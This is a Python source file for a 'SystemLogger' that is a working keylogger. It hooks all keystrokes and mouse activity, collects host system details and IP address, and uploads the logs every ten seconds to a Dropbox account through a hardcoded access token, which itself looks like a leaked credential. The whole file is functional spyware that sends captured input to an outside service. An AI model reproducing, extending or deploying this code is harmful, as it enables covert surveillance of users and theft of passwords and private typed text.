import platform
import psutil
import keyboard
import io
import threading
import time
import dropbox
from datetime import datetime
from pynput.mouse import Listener as MouseListener
from pynput.mouse import Button, Controller as MouseController
import socket

class SystemLogger:
    def __init__(self):
        self.log_folder = '/Logs'
        self.log = ""
        self.dropbox_token ='sl.B01BA0napQ8N4AAGjDUH_6UmGSxn2RDMZdFu60sfta2nuDKfT4eHCzr34Mm1Cip66yMz6UiSxBptrGrjN0GfNQzf7VcEVYExnbqANOsYuCvfsjXxyeWGPYpL0tscpZUQD4wBe_MzgkY8tYy_WG_29js'
        self.stop_flag = False
        self.interval = 10
        self.mouse = MouseController()

    def get_system_details(self):
        system_details = {}

        # Get basic system information
        system_details['System'] = platform.system()
        system_details['Node'] = platform.node()
        system_details['Release'] = platform.release()
        system_details['Version'] = platform.version()
        system_details['Architecture'] = platform.architecture()

        # Get CPU information
        cpu_info = {}
        cpu_info['CPU Count'] = psutil.cpu_count()
        cpu_info['CPU Frequency'] = psutil.cpu_freq(percpu=True)
        cpu_info['CPU Usage'] = psutil.cpu_percent(interval=1, percpu=True)
        system_details['CPU'] = cpu_info

        # Get memory information
        mem_info = {}
        mem_info['Total Memory'] = psutil.virtual_memory().total
        mem_info['Available Memory'] = psutil.virtual_memory().available
        mem_info['Used Memory'] = psutil.virtual_memory().used
        mem_info['Free Memory'] = psutil.virtual_memory().free
        system_details['Memory'] = mem_info

        # Get disk information
        disk_info = {}
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                disk_usage = psutil.disk_usage(partition.mountpoint)
                disk_info[partition.mountpoint] = {
                    'Total': disk_usage.total,
                    'Used': disk_usage.used,
                    'Free': disk_usage.free,
                    'Percent': disk_usage.percent
                }
            except PermissionError:
                pass  # Skip inaccessible disk
        system_details['Disk'] = disk_info

        # Get IP address
        system_details['IP Address'] = socket.gethostbyname(socket.gethostname())

        return system_details
 # by rockrao
    def key_callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            name = event.name
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - {name}"
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif len(name) > 1:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
            self.log += log_entry + "\n"

    def mouse_callback_move(self, x, y):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - Mouse moved to ({x}, {y})"
        self.log += log_entry + "\n"

    def mouse_callback_click(self, x, y, button, pressed):
        if pressed:
            button_name = str(button).split('.')[-1]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - Mouse {button_name} clicked at ({x}, {y})"
            self.log += log_entry + "\n"

    def mouse_callback_scroll(self, x, y, dx, dy):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        direction = "up" if dy > 0 else "down"
        log_entry = f"{timestamp} - Mouse scrolled {abs(dy)} units {direction}"
        self.log += log_entry + "\n"

    def upload_to_dropbox(self):
        system_details = self.get_system_details()
        log_with_sys_details = str(system_details) + "\n\n" + self.log
        timestamp_str = datetime.now().strftime("%Y%m%d%H%M%S")
        filename = f"log-{timestamp_str}.txt"
        file_path = f"{self.log_folder}/{filename}"
        print("Uploading to Dropbox:", file_path)
        with io.BytesIO(log_with_sys_details.encode()) as data:
            try:
                dbx = dropbox.Dropbox(self.dropbox_token)
                dbx.files_upload(data.getvalue(), file_path)
                print(f"[+] Uploaded {filename} to Dropbox")
            except dropbox.exceptions.ApiError as e:
                print(f"[-] Dropbox upload failed: {e}")

    def report_logs(self):
        while not self.stop_flag:
            time.sleep(self.interval)
            self.upload_to_dropbox()
            self.log = ""  # Clear log after upload

    def start(self):
        print("logger is running.")
        logging_thread = threading.Thread(target=self.report_logs)
        logging_thread.daemon = True
        logging_thread.start()
        keyboard.hook(self.key_callback)
        with MouseListener(on_move=self.mouse_callback_move, on_click=self.mouse_callback_click, on_scroll=self.mouse_callback_scroll) as listener:
            try:
                listener.join()
            except Exception as e:
                print(f"Error in listener.join(): {e}")

if __name__ == "__main__":
    logger = SystemLogger()
    logger.start()
